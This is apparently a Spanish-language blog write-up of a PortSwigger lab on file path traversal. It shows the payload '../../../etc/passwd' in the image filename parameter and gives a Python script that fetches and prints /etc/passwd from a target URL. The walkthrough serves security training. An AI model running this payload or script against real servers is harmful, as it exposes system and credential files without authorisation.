---
title: "01 File path traversal, simple case"
collection: publications
category: portswigger
permalink: publications/Directory Traversal/01_File path traversal, simple case
excerpt: 'Este laboratorio contiene una vulnerabilidad en la visualización de imágenes de productos. La aplicación valida que el nombre de archivo suministrado termine con la extensión de archivo esperada.'
date: 2024-12-07
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'File path traversal, simple case'
---

![logo]({{site.url}}/images/Directory Traversal/directory-traversal-01/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Directory Traversal/directory-traversal-01/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, recuperamos el contenido del archivo `/etc/passwd`.

## Analisis

El laboratorio nos indica que la vulnerabilidad se encuentra en la visualización de imágenes de productos, vamos a probar alli.
En el endpoint `/image?filename=48.jpg `

![Conf1]({{site.url}}/images/Directory Traversal/directory-traversal-01/conf1.png)

Probamos ingresando al passwd desde raiz, lo que estamos tratando de ingresa es al directorio. `/var/www/images/etc/passwd` y evidentemente no existe esa ruta. Asi que debemos retroceder con `../`

![Conf2]({{site.url}}/images/Directory Traversal/directory-traversal-01/conf2.png) 

Ai que vamos a devolvernos en la ruta `../../../etc/passwd`, ahora con esa instrucción, nos devolvemos a la raiz e ingresamos a la ruta adecuada `/etc/passwd` que si existe ese archivo.

![Conf3]({{site.url}}/images/Directory Traversal/directory-traversal-01/conf3.png) 

# Codigo Python

```python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url +'/image?filename=../../../../etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```